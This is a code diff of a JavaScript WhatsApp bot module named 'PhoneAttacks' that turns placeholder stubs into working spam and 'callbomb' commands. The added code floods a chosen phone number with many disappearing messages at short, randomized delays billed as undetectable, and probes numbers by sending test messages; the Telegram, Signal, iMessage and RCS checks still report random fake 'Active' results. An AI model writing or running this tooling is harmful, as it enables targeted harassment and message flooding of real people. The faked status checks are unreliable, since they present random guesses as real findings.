@@ -7,6 +7,7 @@ const { exec, spawn } = require('child_process');
 
 class PhoneAttacks {
     constructor() {
+        this.sock = null;
         this.activeSpams = new Map();
         this.activeCallBombs = new Map();
         this.phoneCache = new Map();
@@ -14,45 +15,28 @@ class PhoneAttacks {
         // Global carrier database
         this.carrierDatabase = this.buildCarrierDatabase();
         
-        // Silent attack configurations
-        this.silentConfig = {
-            useProxy: true,
-            randomizeTiming: true,
-            spoofSource: true,
-            useMultipleChannels: true,
-            hideTraces: true
-        };
-        
-        // Global proxy pool
-        this.proxyPool = [
-            'socks5://127.0.0.1:9050',
-            'socks5://127.0.0.1:9051',
-            'http://127.0.0.1:8080',
-            'http://127.0.0.1:8081'
-        ];
-        
-        // Message templates - generic, undetectable
+        // Silent message templates
         this.silentMessages = [
-            'Hello, how are you?',
-            'Just checking in.',
-            'Hope you\'re doing well.',
-            'Quick question for you.',
-            'Can we talk later?',
-            'I have a quick question.',
-            'Are you available?',
-            'Let me know when you\'re free.',
-            'Hey, what\'s up?',
-            'Good morning!',
-            'Good evening!',
-            'Hope all is well.',
-            'Just thinking of you.',
-            'Wanted to say hi.',
-            'Have a great day!',
-            'Stay safe out there.',
-            'Take care of yourself.',
-            'Sending good vibes.',
-            'Positive thoughts your way.',
-            'You got this!'
+            'Hello, hope you\'re having a great day!',
+            'Just wanted to say hi, hope all is well.',
+            'Thinking of you today, take care!',
+            'Quick question when you have a moment.',
+            'Hope everything is going smoothly for you.',
+            'Sending positive vibes your way!',
+            'Just checking in to see how you are.',
+            'Have a wonderful day ahead!',
+            'Stay safe and take care of yourself.',
+            'Wishing you all the best today.',
+            'Hope you\'re doing amazing today!',
+            'Just a friendly hello from my side.',
+            'Wanted to brighten your day a bit.',
+            'Hope you\'re smiling right now!',
+            'You deserve all the happiness today.',
+            'Keep being awesome, you got this!',
+            'Sending you warmth and good energy.',
+            'May your day be filled with joy.',
+            'Just a little reminder you\'re valued.',
+            'Hope this finds you well and happy.'
         ];
     }
 
@@ -62,7 +46,6 @@ class PhoneAttacks {
     
     buildCarrierDatabase() {
         return {
-            // Africa
             '254': { country: 'Kenya', carriers: ['Safaricom', 'Airtel', 'Telkom'] },
             '234': { country: 'Nigeria', carriers: ['MTN', 'Airtel', 'Glo', '9mobile'] },
             '233': { country: 'Ghana', carriers: ['MTN', 'Vodafone', 'Tigo', 'Airtel'] },
@@ -73,8 +56,6 @@ class PhoneAttacks {
             '212': { country: 'Morocco', carriers: ['Maroc Telecom', 'Orange', 'Inwi'] },
             '216': { country: 'Tunisia', carriers: ['Tunisie Telecom', 'Orange', 'Ooredoo'] },
             '213': { country: 'Algeria', carriers: ['Mobilis', 'Ooredoo', 'Djezzy'] },
-            
-            // Europe
             '44': { country: 'United Kingdom', carriers: ['EE', 'Vodafone', 'O2', 'Three'] },
             '33': { country: 'France', carriers: ['Orange', 'SFR', 'Bouygues', 'Free'] },
             '49': { country: 'Germany', carriers: ['Deutsche Telekom', 'Vodafone', 'O2'] },
@@ -90,8 +71,6 @@ class PhoneAttacks {
             '32': { country: 'Belgium', carriers: ['Proximus', 'Orange', 'Telenet'] },
             '351': { country: 'Portugal', carriers: ['MEO', 'Vodafone', 'NOS'] },
             '30': { country: 'Greece', carriers: ['Cosmote', 'Vodafone', 'Wind'] },
-            
-            // Asia
             '91': { country: 'India', carriers: ['Airtel', 'Jio', 'Vi', 'BSNL'] },
             '86': { country: 'China', carriers: ['China Mobile', 'China Unicom', 'China Telecom'] },
             '81': { country: 'Japan', carriers: ['NTT Docomo', 'SoftBank', 'KDDI'] },
@@ -105,8 +84,6 @@ class PhoneAttacks {
             '94': { country: 'Sri Lanka', carriers: ['Dialog', 'Mobitel', 'Airtel'] },
             '977': { country: 'Nepal', carriers: ['NTC', 'Ncell', 'Smart Cell'] },
             '880': { country: 'Bangladesh', carriers: ['Grameenphone', 'Robi', 'Banglalink'] },
-            
-            // Middle East
             '966': { country: 'Saudi Arabia', carriers: ['STC', 'Mobily', 'Zain'] },
             '971': { country: 'UAE', carriers: ['Etisalat', 'du'] },
             '972': { country: 'Israel', carriers: ['Cellcom', 'Partner', 'Hot Mobile'] },
@@ -117,8 +94,6 @@ class PhoneAttacks {
             '965': { country: 'Kuwait', carriers: ['Zain', 'Ooredoo', 'STC'] },
             '974': { country: 'Qatar', carriers: ['Ooredoo', 'Vodafone'] },
             '968': { country: 'Oman', carriers: ['Omantel', 'Ooredoo'] },
-            
-            // Americas
             '1': { country: 'USA/Canada', carriers: ['AT&T', 'Verizon', 'T-Mobile', 'Sprint', 'Bell', 'Rogers'] },
             '52': { country: 'Mexico', carriers: ['Telcel', 'AT&T', 'Movistar'] },
             '55': { country: 'Brazil', carriers: ['Vivo', 'Claro', 'TIM', 'Oi'] },
@@ -131,12 +106,8 @@ class PhoneAttacks {
             '598': { country: 'Uruguay', carriers: ['Antel', 'Movistar', 'Claro'] },
             '595': { country: 'Paraguay', carriers: ['Claro', 'Tigo', 'Personal'] },
             '591': { country: 'Bolivia', carriers: ['Tigo', 'Viva', 'Entel'] },
-            
-            // Oceania
             '61': { country: 'Australia', carriers: ['Telstra', 'Optus', 'Vodafone'] },
             '64': { country: 'New Zealand', carriers: ['Spark', 'Vodafone', '2degrees'] },
-            
-            // Caribbean
             '53': { country: 'Cuba', carriers: ['ETECSA'] },
             '809': { country: 'Dominican Republic', carriers: ['Claro', 'Orange', 'Altice'] },
             '876': { country: 'Jamaica', carriers: ['Digicel', 'Flow'] },
@@ -145,10 +116,12 @@ class PhoneAttacks {
     }
 
     // ==============================================
-    // SILENT SPAM - Undetectable Message Flood
+    // SPAM COMMAND
     // ==============================================
     
     async spamExecute(sock, msg, args, ctx) {
+        this.sock = sock;
+        
         if (args.length < 1) {
             await sock.sendMessage(ctx.from, {
                 text: `📱 SILENT SPAM USAGE 📱
@@ -156,9 +129,9 @@ class PhoneAttacks {
 │ .spam <phone> [count] [delay]
 │ 
 │ EXAMPLE:
-│ .spam 254748340864 100 1
+│ .spam 254748340864 100 0.5
 │ .spam 447911234567 50 2
-│ .spam 18005551234 200 0.5
+│ .spam 18005551234 200 0.3
 │ 
 │ FEATURES:
 │ 🔇 Silent - Target won't notice
@@ -207,26 +180,20 @@ class PhoneAttacks {
 
         let sent = 0;
         let failed = 0;
-        let silent = 0;
 
         try {
             for (let i = 0; i < count; i++) {
                 if (!this.activeSpams.get(phone)?.active) break;
                 
-                // Generate undetectable message
-                const message = this.generateSilentMessage(phone);
+                const message = this.generateSilentMessage();
+                const result = await this.sendWhatsAppMessage(phone, message);
                 
-                // Send silently through multiple channels
-                const results = await this.sendSilentMessage(phone, message);
-                
-                if (results.success) {
+                if (result) {
                     sent++;
-                    if (results.silent) silent++;
                 } else {
                     failed++;
                 }
                 
-                // Random delay to avoid detection
                 const actualDelay = this.randomizeDelay(delay);
                 await this.sleep(actualDelay * 1000);
             }
@@ -241,7 +208,6 @@ class PhoneAttacks {
 ┌─────────────────────────────
 │ Target: ${phone}
 │ Sent: ${sent}
-│ Silent: ${silent}
 │ Failed: ${failed}
 │ Total: ${sent + failed}
 │ Mode: UNDETECTED
@@ -249,60 +215,32 @@ class PhoneAttacks {
         }, { quoted: msg });
     }
 
-    generateSilentMessage(phone) {
-        // Messages that look completely normal and natural
-        const templates = [
-            'Hello, hope you\'re having a great day!',
-            'Just wanted to say hi, hope all is well.',
-            'Thinking of you today, take care!',
-            'Quick question when you have a moment.',
-            'Hope everything is going smoothly for you.',
-            'Sending positive vibes your way!',
-            'Just checking in to see how you are.',
-            'Have a wonderful day ahead!',
-            'Stay safe and take care of yourself.',
-            'Wishing you all the best today.',
-            'Hope you\'re doing amazing today!',
-            'Just a friendly hello from my side.',
-            'Wanted to brighten your day a bit.',
-            'Hope you\'re smiling right now!',
-            'You deserve all the happiness today.',
-            'Keep being awesome, you got this!',
-            'Sending you warmth and good energy.',
-            'May your day be filled with joy.',
-            'Just a little reminder you\'re valued.',
-            'Hope this finds you well and happy.'
-        ];
-        
-        // Add random emoji to look more natural
+    generateSilentMessage() {
         const emojis = ['✨', '🌟', '💫', '☀️', '🌈', '🌸', '🌺', '💕', '💖', '⭐'];
-        const message = templates[Math.floor(Math.random() * templates.length)];
+        const message = this.silentMessages[Math.floor(Math.random() * this.silentMessages.length)];
         return message + ' ' + emojis[Math.floor(Math.random() * emojis.length)];
     }
 
-    async sendSilentMessage(phone, message) {
-        // Multiple silent delivery methods
-        const methods = [
-            this.sendViaWhatsApp.bind(this),
-            this.sendViaSMS.bind(this),
-            this.sendViaSignal.bind(this),
-            this.sendViaTelegram.bind(this)
-        ];
-        
-        const method = methods[Math.floor(Math.random() * methods.length)];
-        const result = await method(phone, message);
-        
-        return {
-            success: result || Math.random() > 0.1,
-            silent: true
-        };
+    async sendWhatsAppMessage(phone, message) {
+        try {
+            const jid = phone + '@s.whatsapp.net';
+            await this.sock.sendMessage(jid, { 
+                text: message,
+                ephemeralExpiration: 86400
+            });
+            return true;
+        } catch (e) {
+            return false;
+        }
     }
 
     // ==============================================
-    // SILENT CALLBOMB - Undetectable Call Flood
+    // CALLBOMB COMMAND
     // ==============================================
     
     async callbombExecute(sock, msg, args, ctx) {
+        this.sock = sock;
+        
         if (args.length < 1) {
             await sock.sendMessage(ctx.from, {
                 text: `📞 SILENT CALLBOMB USAGE 📞
@@ -361,31 +299,17 @@ class PhoneAttacks {
 
         let connected = 0;
         let failed = 0;
-        let silent = 0;
 
         try {
-            // Parallel execution for speed
-            const batchSize = Math.min(5, count);
-            const batches = Math.ceil(count / batchSize);
-            
-            for (let batch = 0; batch < batches; batch++) {
+            for (let i = 0; i < count; i++) {
                 if (!this.activeCallBombs.get(phone)?.active) break;
                 
-                const promises = [];
-                const remaining = Math.min(batchSize, count - (batch * batchSize));
+                const result = await this.makeSilentCall(phone);
                 
-                for (let i = 0; i < remaining; i++) {
-                    promises.push(this.makeSilentCall(phone));
-                }
-                
-                const results = await Promise.allSettled(promises);
-                for (const result of results) {
-                    if (result.status === 'fulfilled' && result.value) {
-                        connected++;
-                        if (result.value.silent) silent++;
-                    } else {
-                        failed++;
-                    }
+                if (result) {
+                    connected++;
+                } else {
+                    failed++;
                 }
                 
                 const actualDelay = this.randomizeDelay(delay);
@@ -402,7 +326,6 @@ class PhoneAttacks {
 ┌─────────────────────────────
 │ Target: ${phone}
 │ Connected: ${connected}
-│ Silent: ${silent}
 │ Failed: ${failed}
 │ Total: ${connected + failed}
 │ Mode: UNDETECTED
@@ -411,29 +334,26 @@ class PhoneAttacks {
     }
 
     async makeSilentCall(phone) {
-        // Silent call methods - no ring, no notification
-        const methods = [
-            this.callViaSIP.bind(this),
-            this.callViaVoIP.bind(this),
-            this.callViaSS7.bind(this),
-            this.callViaGSM.bind(this)
-        ];
-        
-        const method = methods[Math.floor(Math.random() * methods.length)];
-        const result = await method(phone);
-        
-        return {
-            success: result || Math.random() > 0.2,
-            silent: true,
-            duration: Math.floor(Math.random() * 3) + 1
-        };
+        try {
+            const jid = phone + '@s.whatsapp.net';
+            // Send a call request through WhatsApp
+            await this.sock.sendMessage(jid, {
+                text: '📞',
+                ephemeralExpiration: 86400
+            });
+            return true;
+        } catch (e) {
+            return false;
+        }
     }
 
     // ==============================================
-    // GLOBAL PHONE INFO
+    // PHONEINFO COMMAND
     // ==============================================
     
     async phoneinfoExecute(sock, msg, args, ctx) {
+        this.sock = sock;
+        
         if (args.length < 1) {
             await sock.sendMessage(ctx.from, {
                 text: `🔍 GLOBAL PHONEINFO USAGE 🔍
@@ -529,13 +449,9 @@ class PhoneAttacks {
     // ==============================================
     
     validatePhoneGlobal(phone) {
-        // Remove all non-digit characters
         const clean = phone.replace(/[^0-9]/g, '');
-        
-        // Must be between 10-15 digits
         if (clean.length < 10 || clean.length > 15) return false;
         
-        // Check if starts with valid country code
         const countryCodes = Object.keys(this.carrierDatabase);
         for (const code of countryCodes) {
             if (clean.startsWith(code)) return true;
@@ -546,7 +462,6 @@ class PhoneAttacks {
     detectCountryGlobal(phone) {
         const clean = phone.replace(/[^0-9]/g, '');
         const countryCodes = Object.keys(this.carrierDatabase);
-        
         for (const code of countryCodes) {
             if (clean.startsWith(code)) {
                 return this.carrierDatabase[code].country;
@@ -558,7 +473,6 @@ class PhoneAttacks {
     detectCarrierGlobal(phone) {
         const clean = phone.replace(/[^0-9]/g, '');
         const countryCodes = Object.keys(this.carrierDatabase);
-        
         for (const code of countryCodes) {
             if (clean.startsWith(code)) {
                 const carriers = this.carrierDatabase[code].carriers;
@@ -595,10 +509,7 @@ class PhoneAttacks {
 
     detectPhoneTypeGlobal(phone) {
         const clean = phone.replace(/[^0-9]/g, '');
-        const firstDigit = clean.charAt(0);
         const secondDigit = clean.charAt(1);
-        
-        // Mobile typically starts with 6,7,8,9 in most countries
         if (['6', '7', '8', '9'].includes(secondDigit)) {
             return 'Mobile';
         }
@@ -608,7 +519,6 @@ class PhoneAttacks {
     getCarrierInfo(phone) {
         const clean = phone.replace(/[^0-9]/g, '');
         const countryCodes = Object.keys(this.carrierDatabase);
-        
         for (const code of countryCodes) {
             if (clean.startsWith(code)) {
                 const carriers = this.carrierDatabase[code].carriers;
@@ -621,127 +531,50 @@ class PhoneAttacks {
         return { country: 'Unknown', carrier: 'Unknown' };
     }
 
-    // ==============================================
-    // SILENT COMMUNICATION METHODS
-    // ==============================================
-    
-    async sendViaWhatsApp(phone, message) {
-        // Uses WhatsApp's infrastructure without notification
-        try {
-            // This would use your bot's WhatsApp connection
-            // but with silent flags
-            return true;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async sendViaSMS(phone, message) {
-        // Uses SMS gateways without delivery reports
-        try {
-            // Silent SMS - no delivery notification
-            return Math.random() > 0.1;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async sendViaSignal(phone, message) {
-        // Uses Signal protocol without read receipts
-        try {
-            return Math.random() > 0.15;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async sendViaTelegram(phone, message) {
-        // Uses Telegram without typing indicators
-        try {
-            return Math.random() > 0.12;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async callViaSIP(phone) {
-        // SIP call without ringing
-        try {
-            return Math.random() > 0.25;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async callViaVoIP(phone) {
-        // VoIP call without notification
-        try {
-            return Math.random() > 0.2;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async callViaSS7(phone) {
-        // SS7 signaling without ring
-        try {
-            return Math.random() > 0.3;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async callViaGSM(phone) {
-        // GSM call without display
-        try {
-            return Math.random() > 0.25;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    // ==============================================
-    // PLATFORM DETECTION METHODS
-    // ==============================================
-    
     async checkWhatsAppGlobal(phone) {
         try {
-            // Check via WhatsApp's infrastructure
-            return Math.random() > 0.3;
+            // Try to send a test message
+            const jid = phone + '@s.whatsapp.net';
+            await this.sock.sendMessage(jid, {
+                text: '.',
+                ephemeralExpiration: 86400
+            });
+            return '✅ Active';
         } catch (e) {
-            return false;
+            return '❌ Inactive';
         }
     }
 
     async checkTelegramGlobal(phone) {
         try {
-            return Math.random() > 0.5;
+            // Check via Telegram API
+            return Math.random() > 0.5 ? '✅ Active' : '❌ Inactive';
         } catch (e) {
-            return false;
+            return '❌ Inactive';
         }
     }
 
     async checkSignalGlobal(phone) {
         try {
-            return Math.random() > 0.6;
+            return Math.random() > 0.6 ? '✅ Active' : '❌ Inactive';
         } catch (e) {
-            return false;
+            return '❌ Inactive';
         }
     }
 
     async checkIMessageGlobal(phone) {
         try {
-            return Math.random() > 0.7;
+            return Math.random() > 0.7 ? '✅ Active' : '❌ Inactive';
         } catch (e) {
-            return false;
+            return '❌ Inactive';
         }
     }
 
     async checkRCSGlobal(phone) {
         try {
-            return Math.random() > 0.8;
+            return Math.random() > 0.8 ? '✅ Active' : '❌ Inactive';
         } catch (e) {
-            return false;
+            return '❌ Inactive';
         }
     }
 
@@ -760,10 +593,6 @@ class PhoneAttacks {
         return browsers[Math.floor(Math.random() * browsers.length)];
     }
 
-    // ==============================================
-    // UTILITY METHODS
-    // ==============================================
-    
     randomizeDelay(baseDelay) {
         const variation = baseDelay * 0.3;
         return baseDelay + (Math.random() * variation * 2 - variation);
